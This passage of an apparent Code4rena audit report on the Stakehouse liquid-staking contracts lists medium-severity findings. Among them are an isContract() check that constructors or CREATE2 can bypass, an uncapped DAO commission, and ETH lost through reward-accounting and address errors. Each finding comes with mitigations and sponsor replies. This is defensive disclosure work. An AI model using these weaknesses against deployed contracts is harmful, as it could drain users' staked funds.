class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ITransferHookProcessor</span><span class=\"mtk1\">, </span><span class=\"mtk12\">GiantPoolBase</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Syndicate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">accumulated</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">_stakingFundsVaults</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">-            </span><span class=\"mtk12\">accumulated</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">StakingFundsVault</span><span class=\"mtk1\">(</span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_stakingFundsVaults</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">])).</span><span class=\"mtk11\">batchPreviewAccumulatedETH</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+            </span><span class=\"mtk12\">accumulated</span><span class=\"mtk1\"> += </span><span class=\"mtk11\">StakingFundsVault</span><span class=\"mtk1\">(</span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_stakingFundsVaults</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">])).</span><span class=\"mtk11\">batchPreviewAccumulatedETH</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 </span><span class=\"mtk12\">_lpTokens</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             );</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/160#issuecomment-1329478028\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-16-deth--eth--lptokeneth-can-become-depegged-due-to-eth-20-reward-slashing\" style=\"position:relative;\"><a href=\"#m-16-deth--eth--lptokeneth-can-become-depegged-due-to-eth-20-reward-slashing\" aria-label=\"m 16 deth  eth  lptokeneth can become depegged due to eth 20 reward slashing permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/164\">[M-16] dETH / ETH / LPTokenETH can become depegged due to ETH 2.0 reward slashing</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/164\">ladboy233</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/433\">Trust</a></em></p>\n<p>I want to quote the info from the doc:</p>\n<blockquote>\n<p>SavETH Vault - users can pool up to <code>24 ETH</code> where protected staking ensures no-loss. dETH can be redeemed after staking</p>\n</blockquote>\n<p>and</p>\n<blockquote>\n<p>Allocate savETH &#x3C;> dETH to <code>savETH Vault</code> (24 dETH)</p>\n</blockquote>\n<p>However, the main risk in ETH 2.0 POS staking is the slashing penalty, in that case the ETH will not be pegged and the validator cannot maintain a minimum 32 ETH staking balance.</p>\n<p><a href=\"https://cryptobriefing.com/ethereum-2-0-validators-slashed-staking-pool-error/\">https://cryptobriefing.com/ethereum-2-0-validators-slashed-staking-pool-error/</a></p>\n<h3 id=\"recommended-mitigation-steps-36\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-36\" aria-label=\"recommended mitigation steps 36 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>We recommand the protocol to add mechanism to ensure the dETH is pegged via burning if case the ETH got slashed.</p>\n<p>And consider when the node do not maintain a minmum 32 ETH staking balance, who is in charge of adding the ETH balance to increase the staking balance or withdraw the ETH and distribute the fund.</p>\n<p><strong>Please note: the following comment occurred after judging and awarding were finalized.</strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/164#issuecomment-1384355141\">vince0656 (Stakehouse) disputed and commented</a>:</strong></p>\n<blockquote>\n<p>There is no peg associated with dETH. Users can redeem underlying staked ETH by rage quitting Stakehouse protocol. This is taken care of by the Stakehouse protocol through SLOT (which protects) dETH due to redemption rate mechanics and further special exit penalty. Please see audit reports for Stakehouse:<br>\nAudit report 1: <a href=\"https://github.com/runtimeverification/publications/blob/main/reports/smart-contracts/Blockswap_Stakehouse.pdf\">https://github.com/runtimeverification/publications/blob/main/reports/smart-contracts/Blockswap_Stakehouse.pdf</a><br>\nAudit report 2: <a href=\"https://github.com/runtimeverification/publications/blob/main/reports/smart-contracts/Blockswap_Stakehouse_2nd_Audit.pdf\">https://github.com/runtimeverification/publications/blob/main/reports/smart-contracts/Blockswap_Stakehouse_2nd_Audit.pdf</a><br></p>\n</blockquote>\n<hr>\n<h2 id=\"m-17-addressiscontract-is-not-a-reliable-way-of-checking-if-the-input-is-an-eoa\" style=\"position:relative;\"><a href=\"#m-17-addressiscontract-is-not-a-reliable-way-of-checking-if-the-input-is-an-eoa\" aria-label=\"m 17 addressiscontract is not a reliable way of checking if the input is an eoa permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/189\">[M-17] <code>Address.isContract()</code> is not a reliable way of checking if the input is an EOA</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/189\">yixxas</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/137\">CloudX</a> and <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/108\">ladboy233</a></em></p>\n<p>The underlying assumption of <code>eoaRepresentative</code> being an EOA can be untrue. This can cause many unintended effects as the contract comments strongly suggests that this must be an EOA account.</p>\n<h3 id=\"proof-of-concept-32\" style=\"position:relative;\"><a href=\"#proof-of-concept-32\" aria-label=\"proof of concept 32 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>When BLS public key is registered in <code>registerBLSPublicKeys()</code>, it has the check of</p>\n<blockquote>\n<p><code>require(!Address.isContract(_eoaRepresentative), \"Only EOA representative permitted\")</code></p>\n</blockquote>\n<p>However, this check can be passed even though input is a smart contract if</p>\n<ol>\n<li>Function is called in the constructor. <code>Address.isContract()</code> checks for the code length, but during construction code length is 0.</li>\n<li>Smart contract that has not been deployed yet can be used. The CREATE2 opcode can be used to deterministically calculate the address of a smart contract before it is created. This means that the user can bypass this check by calling this function before deploying the contract.</li>\n</ol>\n<h3 id=\"recommended-mitigation-steps-37\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-37\" aria-label=\"recommended mitigation steps 37 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>It is generally not recommended to enforce an address to be only EOA and AFAIK, this is impossible to enforce due to the aforementioned cases. I recommend the protocol team to take a closer look at this and build the protocol with the assumption that <code>_eoaRepresentative == EOA</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/189#issuecomment-1329461742\">vince0656 (Stakehouse) disputed and commented</a>:</strong></p>\n<blockquote>\n<p>Using tx.origin is generally frowned upon.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/189#issuecomment-1332095711\">LSDan (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The sponsor confirming that they know it’s an issue does not invalidate it as an issue.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-18-node-runners-can-lose-all-their-stake-rewards-due-to-how-the-dao-commissions-can-be-set-to-a-100\" style=\"position:relative;\"><a href=\"#m-18-node-runners-can-lose-all-their-stake-rewards-due-to-how-the-dao-commissions-can-be-set-to-a-100\" aria-label=\"m 18 node runners can lose all their stake rewards due to how the dao commissions can be set to a 100 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/190\">[M-18] Node runners can lose all their stake rewards due to how the DAO commissions can be set to a 100%</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/190\">yixxas</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/450\">joestakey</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/445\">sahar</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/342\">pashov</a>, and <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/245\">cccz</a></em></p>\n<p>Node runners can have all their stake rewards taken by the DAO as commissions can be set to a 100%.</p>\n<h3 id=\"proof-of-concept-33\" style=\"position:relative;\"><a href=\"#proof-of-concept-33\" aria-label=\"proof of concept 33 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>There is no limits on <code>_updateDAORevenueCommission()</code> except not exceeding <code>MODULO</code>, which means it can be set to a 100%.</p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L948-L955\">LiquidStakingManager.sol#L948-L955</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"115\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_updateDAORevenueCommission</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_commissionPercentage</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_commissionPercentage</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">MODULO</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Invalid commission&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">DAOCommissionUpdated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">daoCommissionPercentage</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_commissionPercentage</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">daoCommissionPercentage</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_commissionPercentage</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>This percentage is used to calculate <code>uint256 daoAmount = (_received * daoCommissionPercentage) / MODULO</code> in <code>_calculateCommission()</code>.<br>\nRemaining is then calculated with <code>uint256 rest = _received - daoAmount</code>, and in this case <code>rest = 0</code>.<br>\nWhen node runner calls <code>claimRewardsAsNodeRunner()</code>, the node runner will receive 0 rewards.<br></p>\n<h3 id=\"recommended-mitigation-steps-38\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-38\" aria-label=\"recommended mitigation steps 38 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>There should be maximum cap on how much commission DAO can take from node runners.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/190#issuecomment-1329453031\">vince0656 (Stakehouse) disputed and commented</a>:</strong></p>\n<blockquote>\n<p>Node runners can see ahead of time what the % commission is and therefore, they can make a decision based on that. However, on reflection, a maximum amount is not a bad idea.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/190#issuecomment-1335557923\">LSDan (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I will leave this in place as I think it’s a valid concern. If the DAO is compromised (<a href=\"https://github.com/code-423n4/2022-11-stakehouse#objectives\">specifically included in scope</a>), the impact is felt immediately and applies to all unclaimed rewards. The node runners can’t necessarily see a high fee rate coming in advance.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-19-when-users-transfer-giantlp-some-rewards-may-be-lost\" style=\"position:relative;\"><a href=\"#m-19-when-users-transfer-giantlp-some-rewards-may-be-lost\" aria-label=\"m 19 when users transfer giantlp some rewards may be lost permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/238\">[M-19] When users transfer GiantLP, some rewards may be lost</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/238\">cccz</a></em></p>\n<p>GiantMevAndFeesPool.beforeTokenTransfer will try to distribute the user’s current rewards to the user when transferring GaintLP, but since beforeTokenTransfer will not call StakingFundsVault.claimRewards to claim the latest rewards, thus making the calculated accumulatedETHPerLPShare smaller and causing the user to lose some rewards.</p>\n<h3 id=\"proof-of-concept-34\" style=\"position:relative;\"><a href=\"#proof-of-concept-34\" aria-label=\"proof of concept 34 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L146-L148\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L146-L148</a></p>\n<h3 id=\"recommended-mitigation-steps-39\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-39\" aria-label=\"recommended mitigation steps 39 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider claiming the latest rewards from StakingFundsVault before the GiantMevAndFeesPool.beforeTokenTransfer calls updateAccumulatedETHPerLP()</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/238#issuecomment-1329443510\">vince0656 (Stakehouse) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>So the nuance here is that due to contract limitations, users should be encouraged for this specific case to claim rewards before transferring tokens due to the requirement of claim params that the contract wouldn’t readily have when executing a transfer. We can document this limitation in detail and encourage users to always claim before transferring the tokens.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/238#issuecomment-1334589905\">LSDan (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I think medium is appropriate for this issue given that we have a loss of funds if the user performs actions out of order.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-20-smartwallet-address-is-not-guaranteed-correct-eth-may-be-lost\" style=\"position:relative;\"><a href=\"#m-20-smartwallet-address-is-not-guaranteed-correct-eth-may-be-lost\" aria-label=\"m 20 smartwallet address is not guaranteed correct eth may be lost permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/317\">[M-20] smartWallet address is not guaranteed correct. ETH may be lost</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/317\">gz627</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/370\">datapunk</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SavETHVault.sol#L206-L207\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SavETHVault.sol#L206-L207</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SavETHVault.sol#L209\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SavETHVault.sol#L209</a></p>\n<p>Liquid staking manager call <code>function withdrawETHForStaking(address _smartWallet, uint256 _amount)</code> to withdraw ETH for staking. It’s manager’s responsibility to set the correct <code>_smartWallet</code> address. However, there is no way to guarantee this. If a typo (or any other reasons) leads to a non-zero non-existent <code>_smartWallet</code> address, this function won’t be able to detect the problem, and the <a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SavETHVault.sol#L209\">ETH transfer statement</a> will always return <code>true</code>. This will result in the ETH permanently locked to a non-existent account.</p>\n<h3 id=\"proof-of-concept-35\" style=\"position:relative;\"><a href=\"#proof-of-concept-35\" aria-label=\"proof of concept 35 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Liquid staking manager call <code>function withdrawETHForStaking(address _smartWallet, uint256 _amount)</code> with a non-zero non-existent <code>_smartWallet</code> address and some <code>_amount</code> of ETH. Function call will succeed but the ETH will be locked to the non-existent <code>_smartWallet</code> address.</p>\n<h3 id=\"recommended-mitigation-steps-40\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-40\" aria-label=\"recommended mitigation steps 40 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The problem can be solved if we can verify the <code>_smartWallet</code> is a valid existent smartWallet before ETH transfer. The easiest solution is to verify the smartWallet has a valid owner since the smart wallet we are using is ownable. So, just add the checking owner code before <a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SavETHVault.sol#L209\">ETH transfer</a>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/317\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/317#issuecomment-1322752041\">LSDan (judge) commented</a>:</strong></p>\n<blockquote>\n<p>As with <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/308\"><code>#308</code></a>, I recommend that the sponsor review all of the duplicates of this issue.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-21-eip1559-rewards-received-by-syndicate-during-the-period-when-it-has-no-registered-knots-can-be-lost\" style=\"position:relative;\"><a href=\"#m-21-eip1559-rewards-received-by-syndicate-during-the-period-when-it-has-no-registered-knots-can-be-lost\" aria-label=\"m 21 eip1559 rewards received by syndicate during the period when it has no registered knots can be lost permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" 